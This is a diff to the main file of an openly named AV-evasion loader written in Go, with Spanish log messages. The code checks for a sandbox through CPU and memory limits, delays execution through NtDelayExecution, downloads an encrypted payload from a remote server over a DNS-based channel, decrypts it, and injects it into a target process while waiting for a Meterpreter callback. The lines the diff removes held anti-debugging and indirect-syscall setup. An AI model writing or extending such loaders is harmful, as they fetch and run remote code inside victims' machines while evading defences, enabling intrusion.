@@ -3,146 +3,136 @@ package main
 import (
 	"encoding/base64"
 	"evasion-av/config"
-	anti_analysis "evasion-av/internal/anti-analysis"
 	injection "evasion-av/internal/injection"
 	"evasion-av/internal/transport"
-	"fmt"
-	"io"
 	"log"
 	"os"
 	"runtime"
-	"time"
+	"unsafe"
 
-	"github.com/f1zm0/acheron"
+	"golang.org/x/sys/windows"
 )
 
 func main() {
-	// Logger y manejo de panic
-	defer func() {
-		if r := recover(); r != nil {
-			log.Printf("Panic capturado: %v\n", r)
-			buf := make([]byte, 1<<16)
-			stackSize := runtime.Stack(buf, true)
-			log.Printf("[STACK TRACE]\n%s\n", string(buf[:stackSize]))
-		}
-	}()
-
-	// Abrir archivo log
-	logFile, err := os.OpenFile("C:\\Users\\Public\\log.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
-
+	logFile, err := os.OpenFile(`C:\Users\Public\log.txt`, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
 	if err != nil {
-		fmt.Fprintf(os.Stderr, "No se pudo abrir log.txt: %v\n", err)
 		return
 	}
 	defer logFile.Close()
-
 	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
-	log.SetOutput(io.MultiWriter(logFile))
+	log.SetOutput(logFile)
+	injection.Log = log.New(logFile, "", log.Ldate|log.Ltime|log.Lshortfile)
 
-	log.Println("=== Ejecución iniciada (modo debug) ===")
+	defer func() {
+		if r := recover(); r != nil {
+			log.Printf("[PANIC] %v\n", r)
+			buf := make([]byte, 1<<16)
+			n := runtime.Stack(buf, true)
+			log.Printf("[STACK]\n%s\n", buf[:n])
+			logFile.Sync()
+		}
+	}()
 
+	log.Println("[+] Iniciando")
 
-	defenses := anti_analysis.NewDefensiveMeasures()
-	debugCheck := anti_analysis.NewDebuggingCheck()
-	if debugCheck.IsDebugged() {
-		log.Println("Debugging detectado en inicio")
-		defenses.Activate()
+	if !envCheck() {
+		log.Println("[-] envCheck: entorno descartado (pocos recursos)")
 		logFile.Sync()
 		return
 	}
+	log.Println("[+] envCheck OK - CPUs:", runtime.NumCPU())
 
-	monitorChan := make(chan struct{})
-	go startAntiDebugMonitor(debugCheck, monitorChan)
+	log.Println("[*] Delay inicial 3.5s...")
+	ntDelay(3500)
+	log.Println("[+] Delay completado")
 
-	// Inicializar Acheron
-	ach, err := acheron.New()
+	iType, err := injection.FromString(config.InjectionType)
 	if err != nil {
-		log.Println("Error inicializando Acheron:", err)
+		log.Println("[-] InjectionType inválido:", config.InjectionType, "-", err)
 		logFile.Sync()
 		return
 	}
-	log.Println("[Checkpoint] Acheron inicializado")
+	log.Println("[+] InjectionType:", config.InjectionType)
 
-	// Inyección
-	injectionType, err := injection.FromString(config.InjectionType)
+	inj, err := injection.NewInjector(iType)
 	if err != nil {
-		log.Println("Error obteniendo tipo de inyección:", err)
+		log.Println("[-] NewInjector error:", err)
 		logFile.Sync()
 		return
 	}
-	log.Println("[Checkpoint] Tipo de inyección:", config.InjectionType)
+	log.Println("[+] Injector listo")
 
-	injector, err := injection.NewInjector(injectionType, ach)
-	if err != nil {
-		log.Println("Error creando injector:", err)
+	data := fetchData()
+	if len(data) == 0 {
+		log.Println("[-] fetchData: payload vacío o error al descargar/descifrar")
 		logFile.Sync()
 		return
 	}
-	log.Println("[Checkpoint] Inyector configurado")
+	log.Printf("[+] Payload obtenido: %d bytes\n", len(data))
 
-	// Ejecutar payload directamente
-	executeMaliciousPayload(injector)
-
-	log.Println("Ejecución finalizada. Esperando indefinidamente...")
+	log.Println("[*] Iniciando inyección en:", config.TargetProcess)
+	log.Println("[*] InjectionType activo:", config.InjectionType)
+	if err := inj.Inject(config.TargetProcess, data); err != nil {
+		log.Println("[-] Inyección fallida:", err)
+		logFile.Sync()
+		return
+	}
+	log.Println("[+] Inyección NT calls OK - esperando callback de Meterpreter...")
 	logFile.Sync()
 }
 
-func startAntiDebugMonitor(check *anti_analysis.DebuggingCheck, stopChan chan<- struct{}) {
-	ticker := time.NewTicker(15 * time.Second)
-	defer ticker.Stop()
-
-	for {
-		select {
-		case <-ticker.C:
-			if check.IsDebugged() {
-				log.Println("Debugging detectado por monitor")
-				close(stopChan)
-				return
-			}
-		}
-	}
+type memoryStatusEx struct {
+	Length               uint32
+	MemoryLoad           uint32
+	TotalPhys            uint64
+	AvailPhys            uint64
+	TotalPageFile        uint64
+	AvailPageFile        uint64
+	TotalVirtual         uint64
+	AvailVirtual         uint64
+	AvailExtendedVirtual uint64
 }
 
-func getKeyBytes() []byte {
-	key, err := base64.StdEncoding.DecodeString(config.EncryptionKey)
-	if err != nil {
-		log.Fatalf("Error decodificando clave base64: %v", err)
+func envCheck() bool {
+	if runtime.NumCPU() < 2 {
+		return false
 	}
-	return key
-}
-func executeMaliciousPayload(injector injection.ProcessInjector) {
-	targetProcess := config.TargetProcess
-	log.Println("TargetProcess:", targetProcess)
-
-	payload := getEncryptedPayload()
-	if len(payload) == 0 {
-		log.Println("Payload vacío o error al obtenerlo")
-		return
+	var ms memoryStatusEx
+	ms.Length = uint32(unsafe.Sizeof(ms))
+	kernel32 := windows.NewLazyDLL("kernel32.dll")
+	ret, _, _ := kernel32.NewProc("GlobalMemoryStatusEx").Call(uintptr(unsafe.Pointer(&ms)))
+	if ret != 0 && ms.TotalPhys < 2*1024*1024*1024 {
+		return false
 	}
-
-	err := injector.Inject(targetProcess, payload)
-	if err != nil {
-		log.Println("Error en inyección:", err)
-		return
-	}
-
-	log.Println("Payload ejecutado exitosamente")
+	return true
 }
 
-func getEncryptedPayload() []byte {
-	key := getKeyBytes()
-	client, err := transport.NewSecureDNSClient("dummy.local", "bin", key, config.EvasiveMode)
+func ntDelay(ms int64) {
+	interval := -ms * 10000
+	windows.NewLazyDLL("ntdll.dll").NewProc("NtDelayExecution").Call(0, uintptr(unsafe.Pointer(&interval)))
+}
+
+func fetchData() []byte {
+	k, err := base64.StdEncoding.DecodeString(config.EncryptionKey)
 	if err != nil {
-		log.Println("Error creando cliente DNS:", err)
+		log.Println("[-] fetchData: error decodificando EncryptionKey:", err)
 		return nil
 	}
 
-	payload, err := client.DownloadAndDecrypt()
+	log.Println("[*] Descargando payload desde:", config.ServerURL)
+	c, err := transport.NewSecureDNSClient("dummy.local", "bin", k, config.EvasiveMode)
 	if err != nil {
-		log.Println("Error descargando y descifrando payload:", err)
+		log.Println("[-] fetchData: NewSecureDNSClient error:", err)
 		return nil
 	}
 
-	log.Println("Payload descargado y descifrado. Tamaño:", len(payload))
-	return payload
+	data, err := c.DownloadAndDecrypt()
+	if err != nil {
+		log.Println("[-] fetchData: DownloadAndDecrypt error:", err)
+		return nil
+	}
+
+	log.Printf("[+] fetchData: %d bytes descargados y descifrados\n", len(data))
+	return data
 }
+
